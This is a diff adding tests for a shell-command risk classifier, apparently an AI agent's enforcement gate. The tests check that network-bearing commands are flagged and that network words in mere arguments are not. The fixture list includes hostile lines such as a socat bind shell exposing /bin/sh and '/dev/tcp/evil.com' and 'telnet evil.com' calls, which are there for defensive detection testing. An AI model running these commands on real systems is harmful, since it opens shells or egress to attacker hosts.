@@ -221,3 +221,102 @@ describe("destructive boundary — remote irreversibility follows the target bra
     expect(ShellSafety.classifyBashRisk("git push")).toBe("shell_remote_publish")
   })
 })
+
+describe("destructive boundary — network detection is token-aware", () => {
+  // `network_request` is high-risk metadata that also widens the sandbox
+  // network mode when allowed, so detecting it from argument text both
+  // misreports the command and grants egress the command never needed.
+  const networkBearing = [
+    "git fetch origin",
+    "git pull",
+    "git push origin feature",
+    "git clone https://example.com/r.git",
+    "git ls-remote origin",
+    "git submodule update --init",
+    "curl https://example.com",
+    "wget https://example.com/f",
+    "npm install",
+    "npm ci",
+    "bun install",
+    "bun add react",
+    "pnpm install",
+    "yarn add left-pad",
+    "pip install requests",
+    "gem install rails",
+    "cargo install ripgrep",
+    "go get example.com/mod",
+    "ssh user@host",
+    "scp file host:/tmp",
+    "sftp host",
+    "rsync -avz dir/ user@host:/backup/",
+    "dig example.com TXT",
+    "nslookup example.com",
+    "telnet evil.com 23",
+    "socat TCP-LISTEN:8080,fork EXEC:/bin/sh",
+    "openssl s_client -connect example.com:443",
+    'bash -c "curl https://example.com"',
+    "timeout 5 curl https://example.com",
+    "echo > /dev/tcp/evil.com/80",
+  ]
+
+  const inert = [
+    'echo "see https://example.com for docs"',
+    'rg -n "ssh " docs/',
+    'grep -rn "curl " src/',
+    "cat README.md | grep http://",
+    'git commit -m "fix npm install docs"',
+    'git log --grep="git push"',
+    'echo "dig example.com"',
+    'echo "host name"',
+    'printf "%s" "scp"',
+    "git status",
+    "git log --oneline",
+    "bun run build",
+    "rsync -avz dir/ /tmp/backup/",
+    "openssl version",
+    "npm run build",
+  ]
+
+  const { EnforcementGate } = require("../../src/enforcement/gate")
+
+  test("network-bearing commands mint network_request", async () => {
+    for (const command of networkBearing) {
+      const gate = await EnforcementGate.create({
+        activeWorkspace: "/Users/test/synergy-control-profile",
+        workspaceType: "worktree",
+      })
+      const result = gate.classify("bash", { command })
+      expect({
+        command,
+        network: result.capabilities.some((c: any) => c.class === "network_request"),
+      }).toEqual({ command, network: true })
+    }
+  })
+
+  test("argument text that names a network tool or URL stays inert", async () => {
+    for (const command of inert) {
+      const gate = await EnforcementGate.create({
+        activeWorkspace: "/Users/test/synergy-control-profile",
+        workspaceType: "worktree",
+      })
+      const result = gate.classify("bash", { command })
+      expect({
+        command,
+        network: result.capabilities.some((c: any) => c.class === "network_request"),
+      }).toEqual({ command, network: false })
+    }
+  })
+
+  test("the original documented false positive no longer widens egress", async () => {
+    // `echo "see https://example.com for docs"` used to be classified as a
+    // network request, which also relaxed the sandbox network mode when the
+    // command was allowed.
+    const gate = await EnforcementGate.create({
+      activeWorkspace: "/Users/test/synergy-control-profile",
+      workspaceType: "worktree",
+      profileId: "autonomous",
+    })
+    const envelope = gate.evaluate("bash", { command: 'echo "see https://example.com for docs"' })
+    expect(envelope.capabilities.some((c: any) => c.class === "network_request")).toBe(false)
+  })
+})
